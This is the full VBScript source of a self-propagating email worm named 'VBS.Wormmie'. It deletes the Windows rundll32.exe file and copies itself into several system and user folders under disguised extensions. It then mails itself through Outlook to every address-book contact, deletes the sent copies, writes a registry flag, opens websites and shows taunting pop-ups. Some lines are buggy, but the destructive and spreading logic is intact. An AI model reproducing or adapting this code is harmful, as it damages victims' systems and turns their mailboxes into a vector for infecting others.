' VBS.Wormmie
' by Dr Virus Quest
'
'
On Error ResumeNext

Set W_S = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
fso.DeleteFile("c:\windows\rundll32.exe")
set file = fso.OpenTextFile(WScript.ScriptFullname,1)
vbscopy=file.ReadAll
main()

sub main()
   On Error Resume Next
   dim wscr,rr, strMsg
   set wscr=CreateObject("WScript.Shell")
   Set dirwin = fso.GetSpecialFolder(0)
   Set dirsystem = fso.GetSpecialFolder(1)
   Set dirtemp = fso.GetSpecialFolder(2)
   Set cFile = fso.GetFile(WScript.ScriptFullName)
   cFile.Copy(dirsystem&"\Wormmie.vbs")
   cFile.Copy("c:\Wormmie.vbs")
   cFile.Copy("c:\Wormmie.bat")
   cFile.Copy("c:\Wormmie.ini")
   cFile.Copy("c:\Wormmie.pif")
   cFile.Copy("c:\Program Files\Wormmie.vbs")
   cFile.Copy("c:\My Documents\Wormmie.vbs")
     
   Set OutlookA = CreateObject("Outlook.Application")
   If OutlookA = "Outlook" Then
      Set Mapi=OutlookA.GetNameSpace("MAPI")
      Set AddLists=Mapi.AddressLists
      For Each ListIndex In AddLists
         If ListIndex.AddressEntries.Count <> 0 Then
            ContactCountX = ListIndex.AddressEntries.Count
            For Count= 1 To ContactCountX
               Set MailX = OutlookA.CreateItem(0)
               Set ContactX = ListIndex.AddressEntries(Count)
               msgbox contactx.address
               Mailx.Recipients.Add(ContactX.Address)
               'msgbox contactx.address
               'Mailx.Recipients.Add(ContactX.Address)
               MailX.To = ContactX.Address
               MailX.Subject = "Wormmie Alert!"
               MailX.Body = vbcrlf&"Wormmie is spreading. Please email to your friends to inform them."&vbcrlf
               Set Attachment=MailX.Attachments
               Attachment.Add dirsystem & "\Wormmie.vbs"
               Mailx.Attachments.Add(dirsystem & "\Wormmie.vbs")
               Mailx.Attachments.Add(dirsystem & "\Wormmie.vbs")
               Mailx.Attachments.Add("C:\Wormmie.vbs")
               MailX.DeleteAfterSubmit = True
               If MailX.To <> "" Then
                  MailX.Send
               End If
               WS.regwrite "HKCU\software\An\mailed", "1"
            Next
         End If
      Next
   Else
      MsgBox "Please forward this to everyone you know.", vbOKOnly & vbExclamation, "Forward This Email"

      If WS.regread ("HKCU\software\An\mailed") <> "1" then
         MsgBox "You already auto send the VIRUS to everyone!!!", vbOKOnly & vbExclamation, "Final Message"
      Else
         MsgBox "Too bad! Not infected yet! Keep trying...", vbOKOnly & vbExclamation, "Error Message"         
      End If

      If Time() = "00:00:00" Then
         MsgBox "Dong! Dong! Dong! Is already mid-night and I'm your worst nightmare!", vbOKOnly & vbExclamation, "Mid-Night"
      Elseif Time() = "12:00:00" Then
         MsgBox "Is noon and let's have lunch together", vbOKOnly & vbExclamation, "Noon"
      End If
   End if

   Randomize
   r=Int((3*Rnd)+1)
      If r=1 then
          WS.Run("http://www.yahoo.com")
      Elseif r=2 Then
          WS.Run("http://www.catcha.com.my")
      Elseif r=3 Then
          WS.Run("http://www.cari.com.my")
      End If

   strMsg= "Wormmie" & vbcrlf
   strMsg= strMsg & "Wormmie! Wormmie! Wormmie! Wormmie! Wormmie! Wormmie! Wormmie!" & vbcrlf
   strMsg= strMsg & "Wormmie! Wormmie! Wormmie! Wormmie! Wormmie! Wormmie! Wormmie!" & vbcrlf
   strMsg= strMsg & "Wormmie! Wormmie! Wormmie! Wormmie! Wormmie! Wormmie! Wormmie!" & vbcrlf
   strMsg= strMsg & "Wormmie! Wormmie! Wormmie! Wormmie! Wormmie! Wormmie! Wormmie!" & vbcrlf
   strMsg= strMsg & "Wormmie! Wormmie! Wormmie! Wormmie! Wormmie! Wormmie! Wormmie!" & vbcrlf
   strMsg= strMsg & "Wormmie! Wormmie! Wormmie! Wormmie! Wormmie! Wormmie! Wormmie!" & vbcrlf
   strMsg= strMsg & "Wormmie! Wormmie! Wormmie! Wormmie! Wormmie! Wormmie! Wormmie!" & vbcrlf
   strMsg= strMsg & "Wormmie! Wormmie! Wormmie! Wormmie! Wormmie! Wormmie! Wormmie!" & vbcrlf
   strMsg= strMsg & "Wormmie! Wormmie! Wormmie! Wormmie! Wormmie! Wormmie! Wormmie!" & vbcrlf
   strMsg= strMsg & "Wormmie! Wormmie! Wormmie! Wormmie! Wormmie! Wormmie! Wormmie!" & vbcrlf
   strMsg= strMsg & "Wormmie! Wormmie! Wormmie! Wormmie! Wormmie! Wormmie! Wormmie!" & vbcrlf
   strMsg= strMsg & "Wormmie! Wormmie! Wormmie! Wormmie! Wormmie! Wormmie! Wormmie!" & vbcrlf
   strMsg= strMsg & "Wormmie! Wormmie! Wormmie! Wormmie! Wormmie! Wormmie! Wormmie!" & vbcrlf
   strMsg= strMsg & "Wormmie! Wormmie! Wormmie! Wormmie! Wormmie! Wormmie! Wormmie!" & vbcrlf
   strMsg= strMsg & "Wormmie! Wormmie! Wormmie! Wormmie! Wormmie! Wormmie! Wormmie!" & vbcrlf
   strMsg= strMsg & "Wormmie! Wormmie! Wormmie! Wormmie! Wormmie! Wormmie! Wormmie!" & vbcrlf
   strMsg= strMsg & "Wormmie! Wormmie! Wormmie! Wormmie! Wormmie! Wormmie! Wormmie!" & vbcrlf
   strMsg= strMsg & "Wormmie! Wormmie! Wormmie! Wormmie! Wormmie! Wormmie! Wormmie!" & vbcrlf
   strMsg= strMsg & "Wormmie! Wormmie! Wormmie! Wormmie! Wormmie! Wormmie! Wormmie!" & vbcrlf
   strMsg= strMsg & "Wormmie! Wormmie! Wormmie! Wormmie! Wormmie! Wormmie! Wormmie!" & vbcrlf
   strMsg= strMsg & "Wormmie! Wormmie! Wormmie! Wormmie! Wormmie! Wormmie! Wormmie!" & vbcrlf
   strMsg= strMsg & "Wormmie! Wormmie! Wormmie! Wormmie! Wormmie! Wormmie! Wormmie!" & vbcrlf
   strMsg= strMsg & "Wormmie! Wormmie! Wormmie! Wormmie! Wormmie! Wormmie! Wormmie!" & vbcrlf
   strMsg= strMsg & "Wormmie! Wormmie! Wormmie! Wormmie! Wormmie! Wormmie! Wormmie!" & vbcrlf
   strMsg= strMsg & "Wormmie! Wormmie! Wormmie! Wormmie! Wormmie! Wormmie! Wormmie!" & vbcrlf
   msgbox strMsg,,"Wormmie"
End sub